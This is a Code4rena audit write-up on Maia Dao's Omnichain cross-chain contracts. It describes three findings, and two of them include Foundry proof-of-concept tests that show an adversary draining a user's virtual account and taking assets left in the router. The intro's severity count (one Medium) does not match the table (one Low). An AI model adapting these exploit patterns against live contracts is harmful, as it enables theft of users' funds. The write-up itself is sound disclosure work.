## About the Audit
This security review was conducted as an involvement in a public and open-source competition hosted by Code4rena.com & Maia Dao. During the audit 2 High and 1 Medium severity vulnerabilities were disclosed that were addressed and fixed by the developers.

If you wish to connect with Alex (*alexxander*) reach out at https://twitter.com/__alexxander_

## Maia Dao Omnichain
Maia Dao's Omnichain contest features an improved version of Maia's cross-chain contracts with emphasize on remediating previously disclosed vulnerabilities and overall code quality improvement by simplifying the logic.

A break down of the positives regarding the refactored code.
* Incorporating LayerZero as the message transport layer has greatly reduced the complexity of the code & has improved the user flows to be more straightforward.
* The manual gas handling state that was present in the previous implementation is absent and this greatly reduces the surface for potential vulnerabilities that can come from tracking what gas is owed.
* Previously disclosed vulnerabilities have been acknowledged & the mitigations are done in such a way that not only remove vulnerabilities but also simplify the code.

## Findings List
| #      | Issue Title                                                                                                   | Severity | Status |
| ------ | ----------------------------------------------------------------- | ------------------------------------------| ------------------|
| [[1]](#my-section1) | Virtual Account's `payableCall` lacks access modifier. Virtual Account can be drained.           | High     | Fixed  |
| [[2]](#my-section2) | Dangerous assumption in `MulticallRootRouter` can make redeeming a settlement impossible.        | High     | Fixed  |
| [[3]](#my-section3) | Not signed deposits to the RootBridgeAgent can be stolen if they miss Router instructions.       | Low      | Fixed  |

[Official report](https://code4rena.com/audits/2023-09-maia-dao-ulysses#top)

## Detailed Explanation
### <a id="my-section1"></a> 1. Virtual Account's `payableCall` lacks access modifier. Virtual Account can be drained.
#### Severity
High
#### Vulnerable Code
[code snippet](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L85-L112)
#### Impact
Anyone can initiate an arbitrary call through a Virtual Account. All assets in the virtual account can be stolen.
#### Description
The `VirtualAccount.call()` method implements a modifier that restricts who can call the function, however, `VirtualAccount.payableCall()` lacks such modifier which opens the possibility of malicious arbitrary calls. The following POC shows how a user can steal from another user's virtual account.
#### Coded POC
1.Place the following imports in `ImportHelper.sol`
```solidity
import {VirtualAccount} from "@omni/VirtualAccount.sol";
import {PayableCall} from "@omni/interfaces/IVirtualAccount.sol";
```
2. Place the following test in `RootTest` contract inside `RootTest.t.sol`
3. Run the test with `forge test --match-test testMissingAccessVA -vv`
Output - adversary steals the innocent user's global Avax tokens

```solidity
function testMissingAccessVA() public {
        testAddLocalTokenArbitrum();

        // Some innocent user 
        address user = address(0x7777);

        // Get some Avax underlying tokens
        avaxMockAssetToken.mint(user, 100 ether);

        hevm.deal(user, 1 ether);

        DepositInput memory depositInput = DepositInput({
            hToken: avaxMockAssethToken,
            token: address(avaxMockAssetToken),
            amount: 100 ether,
            deposit: 100 ether
        });

        GasParams memory gasParams = GasParams({
            gasLimit: 0.5 ether,
            remoteBranchExecutionGas: 0.5 ether
        });

        bytes memory packedData = abi.encodePacked("");

        // Start prank from innocent user
        hevm.startPrank(user);

        // Bridge assets that will be credited to user's Virtual Account
        avaxMockAssetToken.approve(address(avaxPort), 100 ether);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 1 ether}(
            payable(user), packedData, depositInput, gasParams, true
        );

        // Get the innocent user's VA
        VirtualAccount vcAccount = rootPort.fetchVirtualAccount(user);

        // Print the user's balance of the Global Token
        console2.log("Innocent user balance before", ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(address(vcAccount))));

        hevm.stopPrank();

        // Adversary user
        address adversary = address(0x1111);

        // Start Prank from adversary

        hevm.startPrank(adversary);

        // Balance of adversary before
        console2.log("Adversary balance before", ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(address(adversary))));

        // Encode a call to ERC20 "transfer"
        bytes4 selector = bytes4(keccak256(bytes("transfer(address,uint256)")));
        bytes memory data = abi.encodeWithSelector(selector,adversary,100 ether);

        PayableCall[] memory singleCall = new PayableCall[](1);
        
        singleCall[0] = PayableCall({
            target: newAvaxAssetGlobalAddress,
            callData: data,
            value: 0
        });

        // Execute malicious call from the innocent user VA
        vcAccount.payableCall(singleCall);
        
        console2.log("-----------------");

        // Balance of innocent user after
        console2.log("Innocent user balance after", ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(address(vcAccount))));

        // Balance of adversary after
        console2.log("Adversary balance after",ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(address(adversary))));

    }
```
#### Recommendation
Add access control to `VirtualAccount.payableCall(...)`.
### <a id="my-section2"></a> 2. Dangerous assumption in `MulticallRootRouter` can make redeeming a settlement impossible.
#### Severity
High
#### Vulnerable Code
[code snippet 1](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/MulticallRootRouter.sol#L163-L171)
[code snippet 2](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/MulticallRootRouter.sol#L186-L194)
[code snippet 3](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/RootBridgeAgent.sol#L311-L315)
#### Impact
Funds cannot be redeemed and will remain stuck in a settlement.
#### Description
`MulticallRootRouter.execute()` calls `MulticallRootRouter._approveAndCallOut(...)`, however, it passes the Output Parameters recipient also as the refundee. This is dangerous because the recipient Dapp on the Branch Chain can have a different address or not exist on the Root Chain and therefore if a settlement fails it won't be able to be redeemed since the settlement owner is set as the refundee. Here is a scenario -

1. dApp A on a Branch Chain with `(address = 0xbeef)` initiates a `CallOut(...) 0x01` with `OutputParams (0x01)` for the RootRouter
2. `RootBridgeAgent` executor calls `MulticallRootRouter.execute()` which then performs some number of arbitrary calls and gets the `OutputParams` assets into the `MulticallRootRouter`
3. `MulticallRootRouter` attempts to bridge out the assets to the Branch Chain and creates a settlement, passing the recipient `(address = 0xbeef)` but also sets the refundee as `(address = 0xbeef)`.
4. If the settlement fails there is no guarantee that `0xbeef` is a known dApp on the Root Chain and the assets won't be able to be redeemed.
```solidity
function execute(bytes calldata encodedData, uint16) external payable override lock requiresExecutor {
        // Parse funcId
        bytes1 funcId = encodedData[0];
				
				// code ...
            /// FUNC ID: 2 (multicallSingleOutput)
        } else if (funcId == 0x02) {
            // Decode Params
            (
                IMulticall.Call[] memory callData,
                OutputParams memory outputParams,
                uint16 dstChainId,
                GasParams memory gasParams
            ) = abi.decode(_decode(encodedData[1:]), (IMulticall.Call[], OutputParams, uint16, GasParams));

            // Perform Calls
            _multicall(callData);

            // Bridge Out assets
            _approveAndCallOut(
                outputParams.recipient,
                outputParams.recipient,
                outputParams.outputToken,
                outputParams.amountOut,
                outputParams.depositOut,
                dstChainId,
                gasParams
            );
	
				}
// code ...
    }
```
```solidity
function _createSettlement(
        uint32 _settlementNonce,
        address payable _refundee,
        address _recipient,
        uint16 _dstChainId,
        bytes memory _params,
        address _globalAddress,
        uint256 _amount,
        uint256 _deposit,
        bool _hasFallbackToggled
    ) internal returns (bytes memory _payload) {
        // code ...

        // Update Setttlement
        settlement.owner = _refundee;
        settlement.recipient = _recipient;

				// code ...
      
    }
```
```solidity
function redeemSettlement(uint32 _settlementNonce) external override lock {
        // Get setttlement storage reference
        Settlement storage settlement = getSettlement[_settlementNonce];

        // Get deposit owner.
        address settlementOwner = settlement.owner;

        // Check if Settlement is redeemable.
        if (settlement.status == STATUS_SUCCESS) revert SettlementRedeemUnavailable();
        if (settlementOwner == address(0)) revert SettlementRedeemUnavailable();

        // Check if Settlement Owner is msg.sender or msg.sender is the virtual account of the settlement owner.
        if (msg.sender != settlementOwner) {
            if (msg.sender != address(IPort(localPortAddress).getUserAccount(settlementOwner))) {
                revert NotSettlementOwner();
            }
        }
			/// more code ...
    }
```
#### Recommendation
Include an argument that enables users to specify the `refundee` when settlements are created without using a Virtual Account.

### <a id="my-section3"></a> 3. Not signed deposits to the RootBridgeAgent can be stolen if they miss Router instructions.
#### Severity
Low
#### Vulnerable Code
[code snippet](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/RootBridgeAgentExecutor.sol#L82-L106)
#### Impact
If an unsigned deposit is bridged without instruction parameters, the assets are stored in the `MulticallRouter` and can be stolen by another user.
#### Description
For the Deposit flags `0x02` & `0x03` corresponding to bridging out assets without a Virtual Account as a receiver, the receiver is the `MulticallRouter`. The problem is that if a user hasn't specified params for further execution `executeWithDeposit()` doesn't revert which means the bridged assets remain in the `MulticallRootRouter`. At that point an adversary can send a message from a Branch Chain `(0x01 flag)` & `Output params` that correspond the to the left assets and steal them.
```solidity
function executeWithDeposit(address _router, bytes calldata _payload, uint16 _srcChainId)
        external
        payable
        onlyOwner
    {
        // Read Deposit Params
        DepositParams memory dParams = DepositParams({
            depositNonce: uint32(bytes4(_payload[PARAMS_START:PARAMS_TKN_START])),
            hToken: address(uint160(bytes20(_payload[PARAMS_TKN_START:PARAMS_TKN_START_SIGNED]))),
            token: address(uint160(bytes20(_payload[PARAMS_TKN_START_SIGNED:45]))),
            amount: uint256(bytes32(_payload[45:77])),
            deposit: uint256(bytes32(_payload[77:PARAMS_TKN_SET_SIZE]))
        });

        // Bridge In Assets
        _bridgeIn(_router, dParams, _srcChainId);

        // Check if there is additional calldata in the payload
        if (_payload.length > PARAMS_TKN_SET_SIZE) {
            //Execute remote request
            IRouter(_router).executeDepositSingle{value: msg.value}(
                _payload[PARAMS_TKN_SET_SIZE:], dParams, _srcChainId
            );
        }
    }
```
#### Coded POC
1. Place the following test in `RootTest` contract inside `RooTest.t.sol`
2. Run the test with `forge test --match-test testEmptyInstructionsGrief -vv`

Output - logs that an adversary user stole assets from the MulticallRouter that were there because of missing instructions from an innocent user's Bridge Out.
```solidity
function testEmptyInstructionsGrief() public {
        testAddLocalTokenArbitrum();

        // Innocent user
        address user = address(0x7777);

        // Get some avax underlying assets
        avaxMockAssetToken.mint(user, 100 ether);

        hevm.deal(user, 1 ether);

        DepositInput memory depositInput = DepositInput({
            hToken: avaxMockAssethToken,
            token: address(avaxMockAssetToken),
            amount: 100 ether,
            deposit: 100 ether
        });

        GasParams memory gasParams = GasParams({
            gasLimit: 0.5 ether,
            remoteBranchExecutionGas: 0.5 ether
        });

        // empty instructions for the router
        bytes memory packedData = abi.encodePacked("");

        // start prank from innocent user
        hevm.startPrank(user);

        // bridge out assets
        avaxMockAssetToken.approve(address(avaxPort), 100 ether);
        avaxMulticallBridgeAgent.callOutAndBridge{value: 1 ether}(
            payable(user), packedData, depositInput, gasParams
        );

        // Inspect the Root router balance
        console2.log("Root router balance before", ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(rootMulticallRouter)));

        hevm.stopPrank();

        // Adversary user
        address adversary = address(0x1111);

        hevm.deal(adversary, 1 ether);

        Multicall2.Call[] memory calls = new Multicall2.Call[](1);

            // Mock Omnichain dApp call
            calls[0] = Multicall2.Call({
                target: newArbitrumAssetGlobalAddress,
                callData: abi.encodeWithSelector(bytes4(0xa9059cbb), mockApp, 0 ether)
        });

        // Specifies output params that correspond to the left assets in the Root Router

        OutputParams memory outputParams = OutputParams(adversary, newAvaxAssetGlobalAddress, 100 ether, 100 ether);       

        bytes memory stealData = abi.encode(calls, outputParams, avaxChainId);

        bytes memory finalizedData = abi.encodePacked(bytes1(0x02), stealData);

        // Send malicious message
        hevm.startPrank(adversary);

        avaxMulticallBridgeAgent.callOut{value: 1 ether}(
            payable(adversary), finalizedData, gasParams
        );

        // Inspect router & adversary avax balance
        console2.log("Root router balance after", ERC20hTokenRoot(newAvaxAssetGlobalAddress).balanceOf(address(rootMulticallRouter)));
        console2.log("Adversary mock avax token balance after", avaxMockAssetToken.balanceOf(adversary));
    }
```
#### Recommendation
If an unsigned bridge is performed (0x02, 0x03 flags) revert the execution on the `RootBridgeAgent` if there are no params instructions for the `MulticallRootRouter`.



